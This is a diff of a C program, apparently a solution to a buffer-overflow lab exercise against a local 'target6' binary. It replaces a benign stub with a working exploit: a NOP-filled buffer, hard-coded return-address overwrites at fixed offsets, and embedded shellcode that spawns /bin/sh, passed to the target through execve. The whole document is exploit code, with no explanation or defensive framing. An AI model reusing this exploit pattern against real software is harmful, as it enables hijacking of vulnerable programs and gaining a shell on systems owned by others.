@@ -5,17 +5,44 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target6"
+#define BUF_SIZE 192
+#define ATTACK60 0x2021fe39
+#define ATTACK72 0x0104ee28
+#define ATTACK76 0x0104ee60
 
-int main(void)
-{
-  char *args[3];
-  char *env[1];
+int main(void) {
+	char *args[3];
+	char *env[1];
+  
+	char attack[BUF_SIZE];
+	memset(attack, '\x90', BUF_SIZE);
+	
+	int* overwrite = (int*) (attack + 60);
+	*overwrite = ATTACK60;
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+	overwrite = (int*)(attack + 72);
+	*overwrite = ATTACK72;
+    
+	overwrite = (int*)(attack + 76);
+	*overwrite = ATTACK76;
+    
+	char mod_shell[] =
+        	"\xeb\x25\x90\x90\x91\x90\x90\x90"
+		"\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+		"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+		"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+  
+	memcpy(attack, mod_shell, strlen(mod_shell));
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
-
-  return 0;
+	args[0] = TARGET;
+	args[1] = attack;
+	args[2] = NULL;
+    
+	env[0] = NULL;
+    
+	if (0 > execve(TARGET, args, env))
+	fprintf(stderr, "execve failed.\n");
+  
+	return 0;
 }
+
